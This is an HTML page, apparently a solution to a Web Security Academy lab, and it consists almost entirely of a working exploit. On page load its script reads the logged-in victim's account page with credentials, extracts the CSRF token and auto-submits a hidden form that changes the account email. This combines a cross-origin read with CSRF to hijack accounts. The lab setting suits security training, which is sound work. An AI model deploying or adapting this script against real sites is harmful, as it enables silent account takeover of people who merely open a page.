<html>
<head>
<script>
	var vulDomain = "acad1fe71eb55654c04c21cc001d00c9";
	if(document.getElementById('myform')==null){
		document.write("<form name='myform' id='myform' method='post' action='https://" + vulDomain + ".web-security-academy.net/my-account/change-email' ><input type='text' name='email' id='email' value='newemail@mail.com'><input type='hidden' name='csrf' id='csrf' value=''></form>");
	}
	function change_email(){
		var xhr = new XMLHttpRequest();xhr.open("GET", "https://" + vulDomain + ".web-security-academy.net/my-account", true);
		xhr.withCredentials = true;
		xhr.send();
		xhr.onreadystatechange = function () {
		    if (this.readyState == 4) {
				parser = new DOMParser();
				var d = parser.parseFromString(xhr.responseText, "text/html");
				var cs = d.querySelector('input[name="csrf"]').value;
				document.getElementById('csrf').value = cs;
				document.getElementById('myform').submit();
		    }
		}
	}

	change_email();
</script>
</head>
<body>
Teste local da solucao sem precisar usar o BurpCollaborator
</body>
</html>